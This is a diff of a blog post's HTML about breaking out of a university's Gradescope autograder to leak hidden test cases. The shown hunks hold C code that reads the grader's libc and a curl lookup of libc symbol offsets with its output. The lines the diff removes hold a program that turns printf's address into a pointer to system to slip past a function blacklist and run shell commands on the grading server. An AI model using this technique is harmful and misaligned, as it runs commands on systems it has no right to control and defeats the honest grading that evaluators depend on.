@@ -1,56 +1,4 @@
-<!DOCTYPE html>
-<html lang="en"><head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-
-
-  <script type="text/javascript" id="MathJax-script" async
-    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
-  </script>
-<script type="text/javascript">
-window.MathJax = {
-  tex: {
-    inlineMath: [['$', '$'], ['\\(', '\\)']],
-    displayMath: [['$$', '$$'], ['\\[', '\\]']]
-  },
-  chtml: {
-    scale: 1.10   /* Increase font size: 1.0 = default, 1.5 = 150% */
-  }
-};
-</script>
-  <title>leaking test cases from gradescope</title><!-- Begin Jekyll SEO tag v2.8.0 -->
-<meta name="generator" content="Jekyll v3.10.0" />
-<meta property="og:title" content="leaking test cases from gradescope" />
-<meta property="og:locale" content="en_US" />
-<meta name="description" content="recommended listening for this post is duran duran’s come undone" />
-<meta property="og:description" content="recommended listening for this post is duran duran’s come undone" />
-<link rel="canonical" href="http://localhost:4000/2025/10/24/gradescope.html" />
-<meta property="og:url" content="http://localhost:4000/2025/10/24/gradescope.html" />
-<meta property="og:site_name" content="wrenches" />
-<meta property="og:type" content="article" />
-<meta property="article:published_time" content="2025-10-24T05:40:00+08:00" />
-<meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="leaking test cases from gradescope" />
-<script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-10-24T05:40:00+08:00","datePublished":"2025-10-24T05:40:00+08:00","description":"recommended listening for this post is duran duran’s come undone","headline":"leaking test cases from gradescope","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/10/24/gradescope.html"},"url":"http://localhost:4000/2025/10/24/gradescope.html"}</script>
-<!-- End Jekyll SEO tag -->
-<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wrenches" /><link rel="shortcut icon" type="image/x-icon" href="" />
-  <link rel="stylesheet" href="/assets/css/main.css" />
-  <link rel="stylesheet" href="/assets/css/syntax.css">
-
-</head>
-<body a="dark">
-    <main class="page-content" aria-label="Content">
-      <div class="w">
-        <a href="/"></a><article>
-  <p class="post-meta">
-    <time datetime="2025-10-24 05:40:00 +0800">2025-10-24 05:40:00 +0800</time>
-  </p>
-  
-  <h1>leaking test cases from gradescope</h1>
-
-  <p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=Epj84QVw2rc">duran duran’s come undone</a>
+<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=Epj84QVw2rc">duran duran’s come undone</a>
 <img src="/assets/kikuo.png" alt="kikuo" /></p>
 
 <p>alright lets say entirely hypothetically purely theoretically speaking that you are a student in a university with a certain module that requires u to submit samples of code. these samples of code get compiled and tested against expected inputs / outputs.</p>
@@ -180,7 +128,8 @@ failed the regex check
 
 <p>but this implies we, of course, know the ‘order’ of the cars on the train. how do we do that?</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
 
     <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">){</span> <span class="n">perror</span><span class="p">(</span><span class="s">"fopen"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
@@ -205,62 +154,36 @@ failed the regex check
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>we get the md5 hash of <code class="language-plaintext highlighter-rouge">libc</code>, and query an online database.</p>
+<p>(md5 code excised for brevity)</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>s/code-src/eh/scratchwork<span class="o">)</span> <span class="o">&gt;</span> curl <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data</span> <span class="se">\</span>
-     <span class="s1">'{"md5": "f0558b66ef3f614703cc30497c48ec42"}'</span> <span class="se">\</span>
-     <span class="s1">'https://libc.rip/api/find'</span> | jq
-</code></pre></div></div>
+<p>there are online APIs to find versions of libc given their md5 hashes.</p>
 
-<p>which gives us:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span>
-  <span class="p">{</span>
-    <span class="s">"buildid"</span><span class="p">:</span> <span class="s">"def5460e3cee00bfee25b429c97bcc4853e5b3a8"</span><span class="p">,</span>
-    <span class="s">"download_url"</span><span class="p">:</span> <span class="s">"https://libc.rip/download/libc6_2.41-12_amd64.so"</span><span class="p">,</span>
-    <span class="s">"id"</span><span class="p">:</span> <span class="s">"libc6_2.41-12_amd64"</span><span class="p">,</span>
-    <span class="s">"libs_url"</span><span class="p">:</span> <span class="s">"https://deb.debian.org/debian/pool/main/g/glibc//libc6_2.41-12_amd64.deb"</span><span class="p">,</span>
-    <span class="s">"md5"</span><span class="p">:</span> <span class="s">"f688b13e6d1f5845fd77eae4cf2cd040"</span><span class="p">,</span>
-    <span class="s">"sha1"</span><span class="p">:</span> <span class="s">"1582e6da2d33fbdab9c244763217a7ff479a65c7"</span><span class="p">,</span>
-    <span class="s">"sha256"</span><span class="p">:</span> <span class="s">"56e42210fbaee005355b622121fec8b0c16ca80837eddce3e3557075103dda78"</span><span class="p">,</span>
-    <span class="s">"symbols"</span><span class="p">:</span> <span class="p">{</span>
-      <span class="s">"__libc_start_main_ret"</span><span class="p">:</span> <span class="s">"0x29ca8"</span><span class="p">,</span>
-      <span class="s">"dup2"</span><span class="p">:</span> <span class="s">"0xff860"</span><span class="p">,</span>
-      <span class="s">"printf"</span><span class="p">:</span> <span class="s">"0x59900"</span><span class="p">,</span>
-      <span class="s">"puts"</span><span class="p">:</span> <span class="s">"0x805a0"</span><span class="p">,</span>
-      <span class="s">"read"</span><span class="p">:</span> <span class="s">"0x103e90"</span><span class="p">,</span>
-      <span class="s">"str_bin_sh"</span><span class="p">:</span> <span class="s">"0x1a7ea4"</span><span class="p">,</span>
-      <span class="s">"system"</span><span class="p">:</span> <span class="s">"0x53110"</span><span class="p">,</span>
-      <span class="s">"write"</span><span class="p">:</span> <span class="s">"0x104920"</span>
-    <span class="p">},</span>
-    <span class="s">"symbols_url"</span><span class="p">:</span> <span class="s">"https://libc.rip/download/libc6_2.41-12_amd64.symbols"</span>
-  <span class="p">}</span>
-<span class="p">]</span>
-</code></pre></div></div>
-
-<p>so now, we have a bunch of offsets to very useful stuff. what we can now do is get a pointer to <code class="language-plaintext highlighter-rouge">printf</code> (which isn’t blacklisted), increment (or in this case, decrement) it by the relative offset to <code class="language-plaintext highlighter-rouge">system</code>, and then call it.</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
-</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
-  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command</span> <span class="o">=</span> <span class="s">"ls -alps"</span><span class="p">;</span>
-  <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">printf</span> <span class="o">-</span> <span class="mh">0x59900</span> <span class="o">+</span> <span class="mh">0x53110</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">rawr</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">))</span> <span class="n">ptr</span><span class="p">;</span>
-  <span class="n">rawr</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="p">}</span>
-</code></pre></div></div>
-
-<h3 id="stage-4-execution-level">stage 4: execution level</h3>
-
-<p>when the entirely hypothetical faculty in charge of this entirely hypothetical service keeps up with me i will update this post xoxo</p>
-
-
-</article>
-      </div>
-    </main>
-  </body>
-</html>
+<pre><code class="language-ansi">
+[22;1;32mnavi@curette[22;39m ([22;1;34m~/blog-rawr/_posts[22;39m) &gt; [36mcurl[39m [32m-X[39m POST [32m-H[39m [33m'Content-Type: application/json'[39m [32m--data[39m \
+     [33m'[22;1;34m{[22;33m"md5": "f0558b66ef3f614703cc30497c48ec42"[22;1;34m}[22;33m'[39m \
+     [33m'https://libc.rip/api/find'[39m [22;1;34m|[22;39m [36mjq
+]133;C\[39m  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   861  100   818  100    43   1016     53 --:--:-- --:--:-- --:--:--  1069
+[22;1m[
+  {
+    [34m"buildid"[39m: [22;32m"a43bfc8428df6623cd498c9c0caeb91aec9be4f9"[22;1;39m,
+    [34m"download_url"[39m: [22;32m"https://libc.rip/download/libc6_2.35-0ubuntu3.4_amd64.so"[22;1;39m,
+    [34m"id"[39m: [22;32m"libc6_2.35-0ubuntu3.4_amd64"[22;1;39m,
+    [34m"libs_url"[39m: [22;32m"http://archive.ubuntu.com/ubuntu/pool/main/g/glibc//libc6_2.35-0ubuntu3.4_amd64.deb"[22;1;39m,
+    [34m"md5"[39m: [22;32m"f0558b66ef3f614703cc30497c48ec42"[22;1;39m,
+    [34m"sha1"[39m: [22;32m"cd17cce4c23f891dc4d19b7653d9fead5d52382b"[22;1;39m,
+    [34m"sha256"[39m: [22;32m"2e15e345ccba1e1e8bf3bc58938d13eb7ccc17044942f0376cd5bc771f429b79"[22;1;39m,
+    [34m"symbols"[39m: {
+      [34m"__libc_start_main_ret"[39m: [22;32m"0x29d90"[22;1;39m,
+      [34m"dup2"[39m: [22;32m"0x115200"[22;1;39m,
+      [34m"printf"[39m: [22;32m"0x606f0"[22;1;39m,
+      [34m"puts"[39m: [22;32m"0x80e50"[22;1;39m,
+      [34m"read"[39m: [22;32m"0x1149c0"[22;1;39m,
+      [34m"str_bin_sh"[39m: [22;32m"0x1d8698"[22;1;39m,
+      [34m"system"[39m: [22;32m"0x50d70"[22;1;39m,
+      [34m"write"[39m: [22;32m"0x114a60"
+[22;1;39m    },
+    [34m"symbols_url"[39m: [22;32m"https://libc.rip/download/libc6_2.35-0ubuntu3.4_amd64.symbols"
+[22;1;39m  }
+</code></pre>
